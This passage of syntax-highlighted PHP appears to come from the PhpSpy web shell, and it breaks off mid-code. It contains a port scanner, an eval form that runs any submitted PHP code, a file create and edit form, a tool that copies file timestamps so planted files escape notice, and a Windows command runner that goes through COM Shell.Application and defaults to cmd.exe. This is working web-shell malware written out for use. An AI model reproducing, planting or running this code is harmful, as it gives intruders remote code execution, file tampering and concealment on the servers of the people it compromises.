<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">scanport</span> &amp;&amp; $<span style="color: #f0c674;">scanport</span> = <span style="color: #8abeb7;">'21,25,80,110,135,139,445,1433,3306,3389,5631,4395</span><span style="color: #8abeb7; text-decoration: underline;">8'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formhead(array(</span><span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Port Scan'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'portscan'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;p&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'IP:'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'scanip'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">20</span>,<span style="color: #8abeb7;">'value'</span>=&gt;$<span style="color: #f0c674;">scanip</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'Port:'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'scanport'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">80</span>,<span style="color: #8abeb7;">'value'</span>=&gt;$<span style="color: #f0c674;">scanport</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'startscan'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #8abeb7;">'Scan'</span>,<span style="color: #8abeb7;">'type'</span>=&gt;<span style="color: #8abeb7;">'submit'</span>,<span style="color: #8abeb7;">'class'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #8abeb7; text-decoration: underline;">'bt'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/p&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formfoot(</span>);

<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">startscan</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;h2&gt;Result &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;ul class="info"&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">explode(</span><span style="color: #8abeb7;">','</span>, $<span style="color: #f0c674;">scanport</span>) <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">port</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fp</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">fsockopen(</span>$<span style="color: #f0c674;">scanip</span>, $<span style="color: #f0c674;">port</span>, &amp;$<span style="color: #f0c674;">errno</span>, &amp;$<span style="color: #f0c674;">errstr</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">1</span>);<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (!$<span style="color: #f0c674;">fp</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;li&gt;'</span>.$<span style="color: #f0c674;">scanip</span>.<span style="color: #8abeb7;">':'</span>.$<span style="color: #f0c674;">port</span>.<span style="color: #8abeb7;">' ------------------------ &lt;span styl</span><span style="color: #8abeb7; text-decoration: underline;">e="font-weight:bold;color:#f00;"&gt;Close&lt;/span&gt;&lt;/li&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>  } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;li&gt;'</span>.$<span style="color: #f0c674;">scanip</span>.<span style="color: #8abeb7;">':'</span>.$<span style="color: #f0c674;">port</span>.<span style="color: #8abeb7;">' ------------------------ &lt;span styl</span><span style="color: #8abeb7; text-decoration: underline;">e="font-weight:bold;color:#080;"&gt;Open&lt;/span&gt;&lt;/li&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">fclose(</span>$<span style="color: #f0c674;">fp</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>  }<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/ul&gt;'</span>);
<span style="background-color: #373b41;"> </span>   }
}

<span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'eval'</span>) {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">phpcode</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">trim(</span>$<span style="color: #f0c674;">phpcode</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">phpcode</span>){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (!<span style="color: #c5c8c6; background-color: #1d1f21;">preg_match(</span><span style="color: #8abeb7;">'#&lt;\?#si'</span>, $<span style="color: #f0c674;">phpcode</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">phpcode</span> = <span style="color: #8abeb7;">"&lt;?php\n\n{$phpcode}\n\n?&gt;"</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">eval(</span><span style="color: #8abeb7;">"?"</span>.<span style="color: #8abeb7;">"&gt;$phpcode&lt;?"</span>);
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formhead(array(</span><span style="color: #8abeb7;">'title'</span>=<span style="color: #81a2be;">&gt;</span><span style="color: #8abeb7;">'Eval PHP Code'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'eval'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">maketext(array(</span><span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'PHP Code'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'phpcode'</span>, <span style="color: #8abeb7;">'value'</span>=&gt;$<span style="color: #f0c674;">phpcode</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;p&gt;&lt;a href="http://w'</span>.<span style="color: #8abeb7;">'ww.4ng'</span>.<span style="color: #8abeb7;">'el.net/php'</span>.<span style="color: #8abeb7;">'spy/pl'</span>.<span style="color: #8abeb7;">'ugin/" target="_bla</span><span style="color: #8abeb7; text-decoration: underline;">nk"&gt;Get plugins&lt;/a&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formfooter(</span>);
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end eval</span>

<span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'editfile'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">file_exists(</span>$<span style="color: #f0c674;">opfile</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fp</span>=@<span style="color: #c5c8c6; background-color: #1d1f21;">fopen(</span>$<span style="color: #f0c674;">opfile</span>,<span style="color: #8abeb7;">'r'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">contents</span>=@<span style="color: #c5c8c6; background-color: #1d1f21;">fread(</span>$<span style="color: #f0c674;">fp</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">filesize(</span>$<span style="color: #f0c674;">opfile</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">fclose(</span>$<span style="color: #f0c674;">fp</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">contents</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">htmlspecialchars(</span>$<span style="color: #f0c674;">contents</span>);
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formhead(array(</span><span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Create / Edit File'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'file'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'dir'</span>,$<span style="color: #f0c674;">nowpath</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Current File (import new file name and new file)'</span>,<span style="color: #8abeb7; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #8abeb7; text-decoration: underline;">'editfilename'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'value'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #f0c674; text-decoration: underline;">opfile</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">maketext(array(</span><span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'File Content'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'filecontent'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;$<span style="color: #f0c674;">conte</span><span style="color: #f0c674; text-decoration: underline;">nts</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formfooter(</span>);

<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">goback(</span>);

}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end editfile</span>

<span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'newtime'</span>) {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">opfilemtime</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">filemtime(</span>$<span style="color: #f0c674;">opfile</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">$time = strtotime("$year-$month-$day $hour:$minute:$second");</span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">cachemonth</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'January'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>,<span style="color: #8abeb7;">'February'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">2</span>,<span style="color: #8abeb7;">'March'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">3</span>,<span style="color: #8abeb7;">'April'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">4</span>,<span style="color: #8abeb7;">'May'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">5</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'June'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">6</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'July'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">7</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'August'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">8</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'September'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">9</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'October'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">10</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'November'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">11</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'December'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">12</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formhead(array(</span><span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Clone folder/file was last modified time'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'file'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'dir'</span>,$<span style="color: #f0c674;">nowpath</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Alter folder/file'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'curfile'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;$<span style="color: #f0c674;">opf</span><span style="color: #f0c674; text-decoration: underline;">ile</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'size'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">120</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Reference folder/file (fullpath)'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'tarfile</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'size'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">120</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formfooter(</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formhead(array(</span><span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Set last modified'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'file'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'dir'</span>,$<span style="color: #f0c674;">nowpath</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Current folder/file (fullpath)'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'curfile'</span>,<span style="color: #8abeb7; text-decoration: underline;">'value'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #f0c674; text-decoration: underline;">opfile</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'size'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">120</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;p&gt;year:'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'year'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">date(</span><span style="color: #8abeb7;">'Y'</span>,$<span style="color: #f0c674;">opfilemtime</span>),<span style="color: #8abeb7;">'size'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">4</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'month:'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'month'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">date(</span><span style="color: #8abeb7;">'m'</span>,$<span style="color: #f0c674;">opfilemtime</span>),<span style="color: #8abeb7;">'size'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">2</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'day:'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'day'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">date(</span><span style="color: #8abeb7;">'d'</span>,$<span style="color: #f0c674;">opfilemtime</span>),<span style="color: #8abeb7;">'size'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">2</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'hour:'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'hour'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">date(</span><span style="color: #8abeb7;">'H'</span>,$<span style="color: #f0c674;">opfilemtime</span>),<span style="color: #8abeb7;">'size'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">2</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'minute:'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'minute'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">date(</span><span style="color: #8abeb7;">'i'</span>,$<span style="color: #f0c674;">opfilemtime</span>),<span style="color: #8abeb7;">'size'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">2</span>))<span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'second:'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'second'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">date(</span><span style="color: #8abeb7;">'s'</span>,$<span style="color: #f0c674;">opfilemtime</span>),<span style="color: #8abeb7;">'size'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">2</span>))<span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/p&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formfooter(</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">goback(</span>);
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end newtime</span>

<span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'shell'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #cc6666; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #cc6666; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">program</span> &amp;&amp; $<span style="color: #f0c674;">parameter</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">shell</span>= <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">COM</span>(<span style="color: #8abeb7;">'Shell.Application'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">a</span> = $<span style="color: #f0c674;">shell</span>-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">ShellExecute</span>($<span style="color: #f0c674;">program</span>,$<span style="color: #f0c674;">parameter</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span><span style="color: #8abeb7;">'Program run has '</span>.(!$<span style="color: #f0c674;">a</span> ? <span style="color: #8abeb7;">'success'</span> : <span style="color: #8abeb7;">'fail'</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">program</span> &amp;&amp; $<span style="color: #f0c674;">program</span> = <span style="color: #8abeb7;">'c:\windows\system32\cmd.exe'</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">parameter</span> &amp;&amp; $<span style="color: #f0c674;">parameter</span> = <span style="color: #8abeb7;">'/c net start &gt; '</span>.<span style="color: #cc6666; font-weight: bold;">SA_ROOT</span>.<span style="color: #8abeb7;">'log.txt'</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formhead(array(</span><span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Execute Program'</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'shell'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Program'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'program'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;$<span style="color: #f0c674;">program</span>,<span style="color: #8abeb7;">'</span><span style="color: #8abeb7; text-decoration: underline;">newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;p&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Parameter'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'parameter'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;$<span style="color: #f0c674;">param</span><span style="color: #f0c674; text-decoration: underline;">eter</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'submit'</span>,<span style="color: #8abeb7;">'class'</span>=&gt;<span style="color: #8abeb7;">'bt'</span>,<span style="color: #8abeb7;">'type'</span>=&gt;<span style="color: #8abeb7;">'submit'</span>,<span style="color: #8abeb7;">'value'</span>=<span style="text-decoration: underline;">&gt;</span><span style="color: #8abeb7; text-decoration: underline;">'Execute'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/p&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formfoot(</span>);
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formhead(array(</span><span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Execute Command'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'shell'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #cc6666; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #cc6666; font-weight: bold;">IS_COM</span>) {
